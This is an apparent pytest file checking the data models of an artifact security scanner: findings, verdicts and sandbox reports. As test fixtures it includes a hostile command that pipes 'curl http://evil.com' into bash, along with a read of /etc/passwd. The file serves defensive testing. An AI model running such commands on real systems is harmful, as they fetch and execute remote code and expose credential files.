from datetime import datetime, timezone

import pytest
from pydantic import ValidationError

from scanner.models.artifact import ArtifactRecord, ArtifactRequest, ArtifactStatus, ArtifactType
from scanner.models.finding import FindingSeverity, ScanFinding, ScannerType
from scanner.models.sandbox import SandboxEvent, SandboxEventType, SandboxReport
from scanner.models.verdict import RiskLevel, ScanVerdict, VerdictDecision


NOW = datetime.now(timezone.utc)


# ==============================================================================
# ARTIFACT MODELS
# ==============================================================================

def test_artifact_request_valid():
    req = ArtifactRequest(
        artifact_type=ArtifactType.PYTHON_PACKAGE,
        source_url="https://pypi.org/packages/requests-3.0.0.tar.gz",
        requested_by="agent-03",
    )
    assert req.artifact_type == ArtifactType.PYTHON_PACKAGE
    assert req.requested_by == "agent-03"


def test_artifact_request_invalid_type_fails():
    with pytest.raises(ValidationError):
        ArtifactRequest(
            artifact_type="docker_image",
            source_url="https://example.com/img.tar",
            requested_by="agent-01",
        )


def test_artifact_request_empty_url_fails():
    with pytest.raises(ValidationError):
        ArtifactRequest(
            artifact_type=ArtifactType.PYTHON_PACKAGE,
            source_url="",
            requested_by="agent-01",
        )


def test_artifact_request_forbids_extra_fields():
    with pytest.raises(ValidationError):
        ArtifactRequest(
            artifact_type=ArtifactType.PYTHON_PACKAGE,
            source_url="https://example.com/pkg.tar.gz",
            requested_by="agent-01",
            priority="HIGH",
        )


def test_artifact_record_defaults():
    record = ArtifactRecord(
        artifact_id="art-001",
        artifact_type=ArtifactType.PYTHON_PACKAGE,
        source_url="https://example.com/pkg.tar.gz",
        requested_by="agent-01",
        created_at=NOW,
        updated_at=NOW,
    )
    assert record.status == ArtifactStatus.QUEUED
    assert record.sha256 is None
    assert record.quarantine_key is None
    assert record.approved_key is None


def test_artifact_status_vocabulary():
    expected = {"QUEUED", "DOWNLOADING", "SCANNING", "SANDBOXING", "APPROVED", "BLOCKED", "REVIEW_REQUIRED", "FAILED"}
    assert {s.value for s in ArtifactStatus} == expected


def test_artifact_record_serialization_roundtrip():
    record = ArtifactRecord(
        artifact_id="art-002",
        artifact_type=ArtifactType.GITHUB_REPO,
        source_url="https://github.com/org/repo",
        requested_by="operator",
        status=ArtifactStatus.SCANNING,
        sha256="abc123",
        quarantine_key="quarantine/art-002/repo.zip",
        created_at=NOW,
        updated_at=NOW,
    )
    reloaded = ArtifactRecord.model_validate_json(record.model_dump_json())
    assert reloaded == record


# ==============================================================================
# FINDING MODELS
# ==============================================================================

def test_scan_finding_valid():
    finding = ScanFinding(
        artifact_id="art-001",
        scanner=ScannerType.BANDIT,
        severity=FindingSeverity.HIGH,
        title="Subprocess call with shell=True",
        description="Use of subprocess with shell=True is a security risk.",
        location="setup.py:42",
        rule_id="B602",
        timestamp=NOW,
    )
    assert finding.scanner == ScannerType.BANDIT
    assert finding.severity == FindingSeverity.HIGH
    assert finding.cve_id is None


def test_scan_finding_pip_audit_with_cve():
    finding = ScanFinding(
        artifact_id="art-001",
        scanner=ScannerType.PIP_AUDIT,
        severity=FindingSeverity.CRITICAL,
        title="CVE-2023-1234 in requests 2.28.0",
        description="Known RCE vulnerability in requests.",
        cve_id="CVE-2023-1234",
        location="requests==2.28.0",
        timestamp=NOW,
    )
    assert finding.cve_id == "CVE-2023-1234"
    assert finding.scanner == ScannerType.PIP_AUDIT


def test_scanner_type_vocabulary():
    expected = {"bandit", "semgrep", "pip_audit", "gitleaks", "sandbox"}
    assert {s.value for s in ScannerType} == expected


def test_finding_severity_vocabulary():
    expected = {"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"}
    assert {s.value for s in FindingSeverity} == expected


def test_scan_finding_invalid_scanner_fails():
    with pytest.raises(ValidationError):
        ScanFinding(
            artifact_id="art-001",
            scanner="trivy",
            severity=FindingSeverity.HIGH,
            title="Some issue",
            description="Details",
            timestamp=NOW,
        )


def test_scan_finding_serialization_roundtrip():
    finding = ScanFinding(
        artifact_id="art-001",
        scanner=ScannerType.GITLEAKS,
        severity=FindingSeverity.CRITICAL,
        title="Hardcoded AWS secret key",
        description="AWS_SECRET_ACCESS_KEY found in plaintext.",
        location="config.py:10",
        rule_id="aws-access-token",
        raw={"match": "AKIAIOSFODNN7EXAMPLE"},
        timestamp=NOW,
    )
    reloaded = ScanFinding.model_validate_json(finding.model_dump_json())
    assert reloaded == finding


# ==============================================================================
# VERDICT MODELS
# ==============================================================================

def test_scan_verdict_approved():
    verdict = ScanVerdict(
        artifact_id="art-001",
        decision=VerdictDecision.APPROVED,
        risk_level=RiskLevel.LOW,
        risk_score=12,
        finding_counts={"LOW": 2, "INFO": 1},
        sha256="deadbeef" * 8,
        timestamp=NOW,
    )
    assert verdict.decision == VerdictDecision.APPROVED
    assert verdict.risk_score == 12
    assert verdict.blocked_reasons == []


def test_scan_verdict_blocked():
    verdict = ScanVerdict(
        artifact_id="art-002",
        decision=VerdictDecision.BLOCKED,
        risk_level=RiskLevel.CRITICAL,
        risk_score=95,
        finding_counts={"CRITICAL": 2, "HIGH": 3},
        blocked_reasons=["Hardcoded secret detected", "Shell execution in sandbox"],
        scanner_verdicts={"bandit": "HIGH", "gitleaks": "CRITICAL", "sandbox": "HIGH"},
        sha256="cafebabe" * 8,
        timestamp=NOW,
    )
    assert verdict.decision == VerdictDecision.BLOCKED
    assert verdict.risk_score == 95
    assert len(verdict.blocked_reasons) == 2


def test_verdict_risk_score_boundaries():
    base = dict(
        artifact_id="art-001",
        decision=VerdictDecision.APPROVED,
        risk_level=RiskLevel.LOW,
        sha256="abc" * 20,
        timestamp=NOW,
    )
    assert ScanVerdict(**{**base, "risk_score": 0}).risk_score == 0
    assert ScanVerdict(**{**base, "risk_score": 100}).risk_score == 100

    with pytest.raises(ValidationError):
        ScanVerdict(**{**base, "risk_score": -1})
    with pytest.raises(ValidationError):
        ScanVerdict(**{**base, "risk_score": 101})


def test_verdict_decision_vocabulary():
    assert {d.value for d in VerdictDecision} == {"APPROVED", "BLOCKED", "REVIEW_REQUIRED"}


def test_verdict_risk_level_vocabulary():
    assert {r.value for r in RiskLevel} == {"LOW", "MEDIUM", "HIGH", "CRITICAL"}


# ==============================================================================
# SANDBOX MODELS
# ==============================================================================

def test_sandbox_event_valid():
    event = SandboxEvent(
        artifact_id="art-001",
        event_type=SandboxEventType.NETWORK_CONNECT,
        detail="192.168.1.100:4444",
        suspicious=True,
        timestamp=NOW,
    )
    assert event.suspicious is True
    assert event.event_type == SandboxEventType.NETWORK_CONNECT


def test_sandbox_event_type_vocabulary():
    expected = {
        "NETWORK_CONNECT", "DNS_LOOKUP", "UNEXPECTED_DOWNLOAD",
        "FILE_READ", "FILE_WRITE", "FILE_DELETE",
        "PROCESS_SPAWN", "SHELL_EXECUTION",
        "SECRET_ACCESS", "ENV_READ", "PRIVILEGE_ESCALATION",
    }
    assert {e.value for e in SandboxEventType} == expected


def test_sandbox_report_clean():
    report = SandboxReport(
        artifact_id="art-001",
        executed=True,
        exit_code=0,
        events=[],
        suspicious_event_count=0,
        duration_seconds=1.23,
        timestamp=NOW,
    )
    assert report.executed is True
    assert report.suspicious_event_count == 0
    assert report.execution_error is None


def test_sandbox_report_with_suspicious_events():
    events = [
        SandboxEvent(
            artifact_id="art-001",
            event_type=SandboxEventType.SHELL_EXECUTION,
            detail="/bin/sh -c 'curl http://evil.com | bash'",
            suspicious=True,
            timestamp=NOW,
        ),
        SandboxEvent(
            artifact_id="art-001",
            event_type=SandboxEventType.SECRET_ACCESS,
            detail="/etc/passwd",
            suspicious=True,
            timestamp=NOW,
        ),
    ]
    report = SandboxReport(
        artifact_id="art-001",
        executed=True,
        exit_code=0,
        events=events,
        suspicious_event_count=2,
        timestamp=NOW,
    )
    assert len(report.events) == 2
    assert report.suspicious_event_count == 2


def test_sandbox_report_failed_execution():
    report = SandboxReport(
        artifact_id="art-001",
        executed=False,
        execution_error="Container OOM killed",
        timestamp=NOW,
    )
    assert report.executed is False
    assert report.execution_error == "Container OOM killed"


def test_sandbox_report_serialization_roundtrip():
    report = SandboxReport(
        artifact_id="art-001",
        executed=True,
        exit_code=1,
        events=[
            SandboxEvent(
                artifact_id="art-001",
                event_type=SandboxEventType.DNS_LOOKUP,
                detail="evil.com",
                suspicious=True,
                timestamp=NOW,
            )
        ],
        suspicious_event_count=1,
        duration_seconds=2.5,
        timestamp=NOW,
    )
    reloaded = SandboxReport.model_validate_json(report.model_dump_json())
    assert reloaded == report
